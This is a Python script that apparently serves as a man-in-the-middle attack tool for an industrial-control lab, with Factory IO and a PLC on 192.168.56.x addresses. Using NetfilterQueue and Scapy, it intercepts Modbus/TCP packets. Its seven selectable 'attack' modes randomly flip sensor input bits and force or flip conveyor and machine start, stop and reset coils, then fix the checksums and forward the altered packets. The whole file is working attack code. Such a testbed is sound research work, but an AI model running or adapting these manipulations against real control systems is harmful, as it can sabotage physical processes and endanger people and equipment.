from netfilterqueue import NetfilterQueue as nfq
from scapy.all import *
import scapy.layers
import sys
import random

attack = ""

def intercept(attack_):
    global attack 
    attack = attack_
    queue = nfq()
    queue.bind(1, modify)
    try:
        queue.run()
    except Exception as e:
        print(e)
        queue.unbind()
def modify(packet):
    scapy_packet = IP(packet.get_payload())
    if attack == "attack0":
        # packet from factoryIO to plc
        if scapy_packet[IP].src == "192.168.56.1" and scapy_packet[IP].dst == "192.168.56.2":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # read discrete inputs function code
                if scapy_packet[TCP].payload.load[7] == 0x02:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # randomly flip I_Z01BC01ArrivedSens
                        if bool(random.getrandbits(1)):
                            payload[9] &= 0xFE
                        else:
                            payload[9] |= 0x01
                        # randomly flip I_Z01BC02EntrySens
                        if bool(random.getrandbits(1)):
                            payload[9] &= 0xFD
                        else:
                            payload[9] |= 0x02
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
    elif attack == "attack1":
        # packet from factoryIO to plc
        if scapy_packet[IP].src == "192.168.56.1" and scapy_packet[IP].dst == "192.168.56.2":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # read discrete inputs function code
                if scapy_packet[TCP].payload.load[7] == 0x02:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # randomly flip I_Z01BC03ArrivedSens
                        if bool(random.getrandbits(1)):
                            payload[10] &= 0xFE
                        else:
                            payload[10] |= 0x01
                        # randomly flip I_Z01BC05EntrySens
                        if bool(random.getrandbits(1)):
                            payload[10] &= 0xFD
                        else:
                            payload[10] |= 0x02
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
    elif attack == "attack2":
        # packet from factoryIO to plc
        if scapy_packet[IP].src == "192.168.56.1" and scapy_packet[IP].dst == "192.168.56.2":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # read discrete inputs function code
                if scapy_packet[TCP].payload.load[7] == 0x02:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # randomly flip I_Z01BC02EntrySens
                        if bool(random.getrandbits(1)):
                            # turn on I_Z01BC02EntrySens
                            payload[9] |= 0x02
                        else:
                            # turn off I_Z01BC02EntrySens
                            payload[9] &= 0xFD
                        # randomly flip I_Z01BC01ArrivedSens
                        if bool(random.getrandbits(1)):
                            payload[9] &= 0xFE
                        else:
                            payload[9] |= 0x01
                        # randomly flip I_Z01MC01_Open
                        if bool(random.getrandbits(1)):
                            # turn on I_Z01MC01_Open
                            payload[9] |= 0x04
                        else:
                            # turn off I_Z01MC01_Open
                            payload[9] &= 0xFB
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
        # packet from PLC to factoryIO
        if scapy_packet[IP].src == "192.168.56.2" and scapy_packet[IP].dst == "192.168.56.1":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # write multiple coils function code
                if scapy_packet[TCP].payload.load[7] == 0x0F:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # write Q_Z01BC02 to 0
                        payload[13] &= 0xFD
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
    elif attack == "attack3":
        # packet from factoryIO to plc
        if scapy_packet[IP].src == "192.168.56.1" and scapy_packet[IP].dst == "192.168.56.2":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # read discrete inputs function code
                if scapy_packet[TCP].payload.load[7] == 0x02:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # randomly flip I_Z01BC05EntrySens
                        if bool(random.getrandbits(1)):
                            # turn on I_Z01BC05EntrySens
                            payload[10] |= 0x02
                        else:
                            # turn off I_Z01BC05EntrySens
                            payload[10] &= 0xFD
                        # randomly flip I_Z01BC03ArrivedSens
                        if bool(random.getrandbits(1)):
                            payload[10] &= 0xFE
                        else:
                            payload[10] |= 0x01
                        # randomly flip I_Z01MC02_Open
                        if bool(random.getrandbits(1)):
                            # turn on I_Z01MC02_Open
                            payload[9] |= 0x10
                        else:
                            # turn off I_Z01MC02_Open
                            payload[9] &= 0xEF
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
        # packet from PLC to factoryIO
        if scapy_packet[IP].src == "192.168.56.2" and scapy_packet[IP].dst == "192.168.56.1":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # write multiple coils function code
                if scapy_packet[TCP].payload.load[7] == 0x0F:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # write Q_Z01BC05 to 0
                        payload[13] &= 0xEF
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
    elif attack == "attack4":
        # packet from factoryIO to plc
        if scapy_packet[IP].src == "192.168.56.1" and scapy_packet[IP].dst == "192.168.56.2":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # read discrete inputs function code
                if scapy_packet[TCP].payload.load[7] == 0x02:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # keep I_Z01BC02EntrySens and I_Z01BC05EntrySens on
                        payload[9] |= 0x02
                        payload[10] |= 0x02
                        # randomly flip I_Z01BC03ArrivedSens
                        if bool(random.getrandbits(1)):
                            payload[10] &= 0xFE
                        else:
                            payload[10] |= 0x01
                        # randomly flip I_Z01BC01ArrivedSens
                        if bool(random.getrandbits(1)):
                            payload[9] &= 0xFE
                        else:
                            payload[9] |= 0x01
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
        # packet from PLC to factoryIO
        if scapy_packet[IP].src == "192.168.56.2" and scapy_packet[IP].dst == "192.168.56.1":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # write multiple coils function code
                if scapy_packet[TCP].payload.load[7] == 0x0F:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # write Q_Z01BC02 to 0
                        payload[13] &= 0xFD
                        # write Q_Z01BC05 to 0
                        payload[13] &= 0xEF
                        # randomly flip I_Z01MC01Start
                        if bool(random.getrandbits(1)):
                            payload[13] &= 0x7F
                        else:
                            payload[13] |= 0x80
                        # randomly flip I_Z01MC01Stop
                        if bool(random.getrandbits(1)):
                            payload[14] &= 0xFE
                        else:
                            payload[14] |= 0x01
                        # randomly flip I_Z01MC02Start
                        if bool(random.getrandbits(1)):
                            payload[14] &= 0xF7
                        else:
                            payload[14] |= 0x08
                        # randomly flip I_Z01MC02Stop
                        if bool(random.getrandbits(1)):
                            payload[14] &= 0xEF
                        else:
                            payload[14] |= 0x10
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
    elif attack == "attack5":
        # packet from PLC to factoryIO
        if scapy_packet[IP].src == "192.168.56.2" and scapy_packet[IP].dst == "192.168.56.1":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # write multiple coils function code
                if scapy_packet[TCP].payload.load[7] == 0x0F:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # write Q_Z01BC02 to 0
                        payload[13] &= 0xFD
                        # write Q_Z01BC05 to 0
                        payload[13] &= 0xEF
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
        # packet from factoryIO to plc
        if scapy_packet[IP].src == "192.168.56.1" and scapy_packet[IP].dst == "192.168.56.2":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # read discrete inputs function code
                if scapy_packet[TCP].payload.load[7] == 0x02:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # randomly flip I_Z01BC01ArrivedSens
                        if bool(random.getrandbits(1)):
                            payload[9] &= 0xFE
                        else:
                            payload[9] |= 0x01
                        # randomly flip I_Z01BC02EntrySens
                        if bool(random.getrandbits(1)):
                            payload[9] &= 0xFD
                        else:
                            payload[9] |= 0x02
                        # randomly flip I_Z01BC03ArrivedSens
                        if bool(random.getrandbits(1)):
                            payload[10] &= 0xFE
                        else:
                            payload[10] |= 0x01
                        # randomly flip I_Z01BC05EntrySens
                        if bool(random.getrandbits(1)):
                            payload[10] &= 0xFD
                        else:
                            payload[10] |= 0x02
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
    elif attack == "attack6":
        # packet from PLC to factoryIO
        if scapy_packet[IP].src == "192.168.56.2" and scapy_packet[IP].dst == "192.168.56.1":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # write multiple coils function code
                if scapy_packet[TCP].payload.load[7] == 0x0F:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # write Q_Z01BC02 to 0
                        payload[13] &= 0xFD
                        # write Q_Z01BC05 to 0
                        payload[13] &= 0xEF
                        # randomly flip Q_Z01MC01Reset
                        if bool(random.getrandbits(1)):
                            payload[14] |= 0x02
                        else:
                            payload[14] &= 0xFD
                        # randomly flip Q_Z01MC02Reset
                        if bool(random.getrandbits(1)):
                            payload[14] |= 0x20
                        else:
                            payload[14] &= 0xDF
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
        # packet from factoryIO to plc
        if scapy_packet[IP].src == "192.168.56.1" and scapy_packet[IP].dst == "192.168.56.2":
            # sanity check for nonzero TCP packet
            if TCP in scapy_packet and  len(scapy_packet[TCP].payload) > 0:
                # read discrete inputs function code
                if scapy_packet[TCP].payload.load[7] == 0x02:
                    try:
                        payload = list(scapy_packet[TCP].payload.load)
                        # randomly flip I_Z01BC01ArrivedSens
                        if bool(random.getrandbits(1)):
                            payload[9] &= 0xFE
                        else:
                            payload[9] |= 0x01
                        # randomly flip I_Z01BC02EntrySens
                        if bool(random.getrandbits(1)):
                            payload[9] &= 0xFD
                        else:
                            payload[9] |= 0x02
                        # randomly flip I_Z01BC03ArrivedSens
                        if bool(random.getrandbits(1)):
                            payload[10] &= 0xFE
                        else:
                            payload[10] |= 0x01
                        # randomly flip I_Z01BC05EntrySens
                        if bool(random.getrandbits(1)):
                            payload[10] &= 0xFD
                        else:
                            payload[10] |= 0x02
                        scapy_packet[TCP].payload.load = bytes(payload)
                        del (scapy_packet[IP].chksum, scapy_packet[TCP].chksum)
                        packet.set_payload(bytes(scapy_packet))
                    except Exception as e:
                        print(e)
    packet.accept()

if __name__ == "__main__":
    intercept(sys.argv[1])
